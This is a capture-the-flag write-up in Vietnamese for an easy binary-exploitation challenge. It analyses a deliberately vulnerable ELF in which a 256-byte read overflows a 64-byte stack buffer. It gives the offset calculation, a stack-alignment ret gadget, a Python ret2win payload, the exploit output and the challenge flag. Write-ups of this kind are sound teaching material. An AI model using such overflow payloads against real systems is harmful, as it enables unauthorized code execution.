# Papers Please — Pwn (Easy)

**Flag:** `H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}`
**Máy chủ mục tiêu:** `pwn.h7tex.com:42578`
**File cung cấp:** `checkpoint.zip` (1077085 B, sha256 `737ceea6...a209da0b`) chứa tệp `checkpoint` (định dạng ELF x86-64, kích thước 16344 B, sha256 `b04ebc61...`), đi kèm `libc.so.6`, trình nạp `ld-linux-x86-64.so.2` và file `README.txt`.
**Bối cảnh chạy:** Hệ điều hành Ubuntu 24.04, nhân thư viện glibc phiên bản 2.39-0ubuntu8.9.

## Đề bài

Hệ thống kiểm tra thông tin người dùng mô phỏng trạm kiểm soát. Hệ thống yêu cầu tên, lưu vào nhật ký log, rồi thông báo: "Access denied ... Turn back." (Từ chối truy cập... Quay xe đi.) trước khi ngắt kết nối. 
Hệ thống tồn tại một hàm cấp quyền. Tuy nhiên, luồng thực thi thông thường không bao giờ gọi hàm này. Nhiệm vụ là: Khai thác hệ thống, điều hướng thực thi vào hàm cấp quyền để trả về cờ (flag).

## Phân tích ban đầu

Đưa tệp qua công cụ phân tích `triage.cjs`, xác định được cấu trúc:

| Thuộc tính | Hiện trạng | Kết luận (Hệ quả) |
| --- | --- | --- |
| Lõi kiến trúc | `ET_EXEC`, cờ PIE tắt (no PIE) | Địa chỉ không thay đổi ngẫu nhiên (base cố định). Không cần rò rỉ bộ nhớ (leak), địa chỉ các hàm cố định. |
| Vệ sĩ Stack (canary) | Vô hiệu hóa (Hàm `__stack_chk_fail` không tồn tại) | Cho phép ghi đè lên địa chỉ trả về (return address) tùy ý. |
| Vùng cấm thực thi (NX) | Bật | Ngăn chặn thực thi mã độc (shellcode) trên stack. Phải sử dụng lại các hàm có sẵn trong hệ thống (ROP). |
| Danh mục Imports | `read fopen fgets printf puts setvbuf fflush fclose` | Điểm yếu: Lệnh `read` đọc dữ liệu không kiểm tra giới hạn của bộ đệm (buffer). |

Phân tích 3 hàm chức năng:

```text
Hàm main        @ 0x401302   Chạy setvbuf(stdout, NULL, _IONBF, 0); Gọi hàm checkpoint.
Hàm checkpoint  @ 0x4012a4   Cấp phát ngăn xếp sub rsp,0x40 -> Khởi tạo bộ đệm (buffer) 64 byte tại vị trí [rbp-0x40].
Hàm grant_access@ 0x401216   Thực thi fopen("/flag","r"); Đọc dữ liệu fgets(buf,0x50); Hiển thị printf("ACCESS GRANTED: %s").
```

Đúng như thiết kế, hàm `main` không triệu gọi `grant_access`. Hàm quan trọng này được tạo ra để đọc tệp `/flag` và hiển thị nội dung ra ngoài.

Lỗ hổng xuất hiện ở hàm `checkpoint`:

```text
4012ce: lea   rax,[rbp-0x40]     ; Gọi bộ đệm 64 byte
4012d2: mov   edx,0x100          ; Yêu cầu đọc 256 byte
4012df: call  read@plt           ; Chạy hàm read(0, buf, 256)
4012fa: call  printf@plt         ; Hiển thị ("Access denied, %s. Turn back.", buf)
```

Lệnh `read(0, buf, 0x100)` truyền 256 byte dữ liệu vào bộ đệm chỉ có dung lượng 64 byte. Không có cơ chế bảo vệ canary, đây là một lỗi tràn bộ đệm (stack overflow) cơ bản.

## Quá trình khai thác

**Bước 1 - Xác định khoảng cách (offset) tới đích return address.** 
Bộ đệm nằm ở `[rbp-0x40]` (kích thước 64 byte), liền kề là lưu trữ rbp (saved rbp) nằm tại `[rbp]` (kích thước 8 byte), và địa chỉ trả về (return address) nằm tại `[rbp+8]`. Tính toán Offset = 64 + 8 = 72 byte. Lệnh `read` cho phép truyền tới 256 byte, đủ không gian cho payload.

**Bước 2 - Điều chỉnh stack (stack alignment).** 
Quy tắc hệ điều hành (ABI) yêu cầu: tại lệnh mở màn của một hàm, con trỏ stack phải thỏa mãn `rsp % 16 == 8`.

- Chuyển hướng trực tiếp vào hàm `grant_access` qua lệnh `leave; ret`: Lệnh `leave` gán `rsp = rbp_checkpoint`, lệnh `pop rbp` điều chỉnh con trỏ lên 8 byte, lệnh `ret` điều chỉnh thêm 8 byte. Kết quả: `rsp = rbp_main + 8`. Hàm `main` khởi tạo cơ bản bằng `push rbp` rồi call trực tiếp, dẫn tới `rbp_main % 16 == 0`. Tổng hợp lại: Truy cập vào `grant_access` với `rsp % 16 == 0`, sai lệch 8 byte so với chuẩn ABI.
- Hàm `grant_access` có gọi các hàm `fopen`/`fgets`/`printf` thuộc glibc 2.39; các hàm này sử dụng `movaps` trên ngăn xếp. Chúng sẽ gây lỗi `SIGSEGV` nếu phát hiện stack bị lệch.

Phương án điều chỉnh: sử dụng gadget (`ret`) để xê dịch con trỏ `rsp` trượt đi 8 byte. Đoạn gadget phù hợp là `_fini @ 0x401334` (kết hợp lệnh: `endbr64; sub rsp,8; add rsp,8; ret`). Gadget này điều chỉnh stack chuẩn 8 byte, có lệnh mở đầu `endbr64` để đảm bảo thực thi qua các cơ chế phòng ngự phần cứng (CET/IBT).

**Bước 3 - Chuẩn bị (payload).**

```python
OFFSET       = 72
GRANT_ACCESS = 0x401216
RET_SLIDE    = 0x401334

# Cấu trúc: [Payload độn đủ 72 byte] + [Gadget điều chỉnh stack] + [Hàm mục tiêu]
payload = b"DANH.B23DCAT040".ljust(OFFSET, b"A") + p64(RET_SLIDE) + p64(GRANT_ACCESS)
```

Payload có kích thước 88 byte, nằm trong giới hạn 256 byte của lệnh `read`. Không cần lo ngại về ký tự `\0` vì hàm `read` xử lý dữ liệu thô, không bị ảnh hưởng bởi ký tự kết thúc chuỗi; dữ liệu dư thừa của `printf` khi gặp `\0` sẽ tự ngắt mà không gây lỗi.

**Bước 4 - Thực thi.**

```bash
cd "H7CTF 2026 Quals/papers-please"
python exploit.py
```

Phản hồi nhận được:

```text
=== Sparrow Freight border checkpoint ===
State your name for the log:
Access denied, DANH.B23DCAT040AAAA...4@. Turn back.
ACCESS GRANTED: H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```

**Bước 5 - Xác nhận cờ.** Sử dụng biểu thức chính quy `H7CTF\{[^}\n]*\}` trích xuất dữ liệu nhận từ socket, lưu trực tiếp cờ vào file `flag.txt`.

## Flag
```text
H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```
